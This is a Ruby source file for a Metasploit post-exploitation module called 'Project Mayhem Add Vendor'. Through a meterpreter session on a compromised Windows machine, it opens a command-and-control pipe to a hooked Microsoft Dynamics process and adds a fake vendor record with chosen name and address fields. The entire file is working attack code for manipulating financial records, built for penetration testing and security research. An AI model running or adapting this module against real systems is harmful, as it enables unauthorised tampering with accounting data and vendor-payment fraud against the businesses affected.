##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/windows/project_mayhem'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::ProjectMayhem

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'Project Mayhem Add Vendor',
			'Description'    => %q{
				Add a vendor through a hooked Dynamics process.
			},
			'Author'        => 'Spencer McIntyre',
			'License'       => MSF_LICENSE,
			'Platform'      => [ 'win' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
			[
				OptString.new('VENDORID', [ false,  "Vendor to manipulate", 'MAYHEM']),
				OptString.new('NAME',     [ false,  "String Description", 'Spencer McIntyre']),
				OptString.new('ADDRESS1', [ false,  "String Description", '1337 Hax0r St.']),
				OptString.new('CITY',     [ false,  "String Description", 'Leetville']),
				OptString.new('STATE',    [ false,  "Address State", 'California']),
				OptInt.new('ZIPCODE',     [ false,  "Address Zip Code", '31337']),
			], self.class)
	end


	def run
		connect
		print_good("Opened a handle to the C&C pipe")

		parameters = {}
		parameters['vendor_id'] = datastore['VENDORID']
		parameters['name'] = datastore['NAME']
		parameters['addr1'] = datastore['ADDRESS1']
		parameters['city'] = datastore['CITY']
		parameters['state'] = datastore['STATE']
		parameters['zipcode'] = datastore['ZIPCODE'].to_s

		begin
			execute_command('add_vendor', parameters)['status']
		rescue RuntimeError => ex
			print_error(ex.message)
			result = nil
		else
			print_good("Command completed successfully!")
		ensure
			disconnect
		end
	end
end
